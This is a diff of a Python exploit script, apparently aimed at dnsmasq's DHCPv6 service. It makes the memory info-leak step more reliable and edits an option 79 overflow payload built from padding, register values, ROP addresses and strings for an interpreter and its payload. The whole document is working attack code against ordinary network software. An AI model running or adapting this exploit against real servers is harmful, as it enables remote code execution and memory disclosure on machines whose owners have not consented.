@@ -13,6 +13,7 @@ from time import sleep
 from binascii import unhexlify
 from ipaddress import IPv6Address
 from os import stat
+from select import select
 
 tm = ThreadManager(3)
 
@@ -129,7 +130,7 @@ ROP = {
     }
 }
 
-LEAK_BYTES = 0xFFBD
+LEAK_BYTES = 0xFF00
 
 Base = Base()
 Base.print_banner()
@@ -288,24 +289,29 @@ def calculate_new_address(new_text_address):
 
 def get_dhcpv6_server_duid():
     if dhcpv6_server_duid is None:
-        print Base.c_info + "Wait for receive DHCPv6 server duid..."
+        print Base.c_info + "Wait for receive DHCPv6 server DUID..."
         tm.add_task(recv_dhcpv6_reply)
         sleep(3)
         send_dhcpv6_solicit()
         sleep(5)
 
-        while True:
+        count_solicit_reqeusts = 0
+        while count_solicit_reqeusts < 2:
             if dhcpv6_server_duid is None:
                 send_dhcpv6_solicit()
+                count_solicit_reqeusts += 1
                 sleep(5)
             else:
                 break
 
-        print Base.c_success + "DHCPv6 server mac address: " + str(dhcpv6_server_mac)
-        print Base.c_success + "DHCPv6 server IPv6 link address: " + str(dhcpv6_server_ipv6_link)
-        print Base.c_success + "DHCPv6 server duid: " + str(dhcpv6_server_duid).encode("hex")
-        sleep(5)
-        return True
+        if dhcpv6_server_duid is None:
+            print Base.c_error + "Can not get DHCPv6 server DUID!"
+            return False
+        else:
+            print Base.c_success + "DHCPv6 server MAC address: " + str(dhcpv6_server_mac)
+            print Base.c_success + "DHCPv6 server IPv6 link address: " + str(dhcpv6_server_ipv6_link)
+            print Base.c_success + "DHCPv6 server DUID: " + str(dhcpv6_server_duid).encode("hex")
+            return True
     else:
         return True
 
@@ -469,9 +475,22 @@ def info_leak():
         exit(1)
 
     with open('response.bin', 'wb') as response_file:
-        response_file.write(sock.recvfrom(LEAK_BYTES)[0])
-    print Base.c_success + "Length info leak response: " + str(stat('response.bin').st_size)
-    print Base.c_success + "Dump info leak response to file: response.bin"
+        sock.setblocking(0)
+        ready = select([sock], [], [], 15)
+        if ready[0]:
+            response_file.write(sock.recvfrom(LEAK_BYTES)[0])
+        else:
+            print Base.c_error + "Can not receive info leak response!"
+            sock.close()
+            exit(1)
+
+    info_leak_size = stat('response.bin').st_size
+    if info_leak_size == LEAK_BYTES:
+        print Base.c_success + "Length info leak response: " + str(hex(info_leak_size))
+    else:
+        print Base.c_error + "Bad length of info leak response: " + str(hex(info_leak_size))
+
+    print Base.c_info + "Dump info leak response to file: response.bin"
     sock.close()
 
 
@@ -485,12 +504,13 @@ def exploit():
 
         option_79 += Base.pack16(0)  # mac_type
 
-        option_79 += "0" * JUNK[architecture][dnsmasq_version]
+        option_79 += "A" * JUNK[architecture][dnsmasq_version]
 
         option_79 += Base.pack32(NOP[architecture])  # EBX = 0x90909090
         option_79 += Base.pack32(NOP[architecture])  # ESI = 0x90909090
         option_79 += Base.pack32(NOP[architecture])  # EDI = 0x90909090
 
+        # option_79 += Base.pack32(CRASH[architecture])  # crash for debug
         option_79 += add_string_in_data(interpreter_addr, interpreter)
         option_79 += add_string_in_data(interpreter_arg_addr, interpreter_arg)
         option_79 += add_string_in_data(payload_addr, payload)
